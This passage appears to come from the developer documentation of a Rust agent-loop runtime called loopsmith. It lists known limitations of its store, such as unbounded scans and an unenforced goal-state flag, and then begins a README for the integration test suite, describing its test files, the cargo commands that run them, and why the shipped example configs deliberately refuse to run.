of:**\n\n- `scan` deserializes an entire prefix into a `Vec` with no limit or cursor. `episodes()` and `ledger()` on a long run load everything into memory. This is fine at current run lengths and is the first thing to revisit if it stops being fine.\n- Scratchpad values are stored as raw bytes and read back through `String::from_utf8_lossy`. They are opaque to the store — no JSON validation, no size limit, and a non-UTF-8 write comes back mangled rather than erroring.\n- `set_goal_state` will happily store `satisfied: true` from any caller. The gate's monopoly is architectural, not enforced at runtime.\n- Integration tests read `config/examples/` and `config/loop.schema.json` from the repository root, which is why `Cargo.toml` ships only `/src/**/*` and `/README.md` — a crate tarball cannot contain those, and shipping the tests would hand a published crate tests that cannot pass.","other":"# Other\n\n# The `loopsmith-cli` integration test suite\n\nEverything else in the runtime is unit-tested in isolation. This directory covers what unit tests structurally cannot: whether the pieces work **together**, under a real iteration loop, driven through the real binary, against the configs users are actually handed.\n\n```sh\ncargo test -p loopsmith --test stress    # the iteration loop\ncargo test -p loopsmith --test surface   # subcommands\ncargo test -p loopsmith --test compat    # portability of generated loops\ncargo test -p loopsmith --test opt_in    # network / money — skips by default\n```\n\n| File | Role |\n|---|---|\n| `harness/mod.rs` | The `Fixture` builder. No tests of its own. |\n| `stress.rs` | Phases, isolation, stop gates, proposals, resume, export |\n| `surface.rs` | Subcommands that were implemented and never executed |\n| `compat.rs` | What a generated loop assumes about the machine it lands on |\n| `opt_in.rs` | Anything that reaches the network or spends money |\n\n## The problem the harness exists to solve\n\nThe shipped examples under `config/examples/` **cannot be run as they stand**, and both reasons are deliberate design, not bugs:\n\n1. **Every example refuses.** `pre_execution` steps ship as `done: false`, so `validate` and `run` both stop. That refusal is the teaching mechanism — a user is meant to read the steps and tick them off.\n2. **No detector scripts exist.** The examples nam
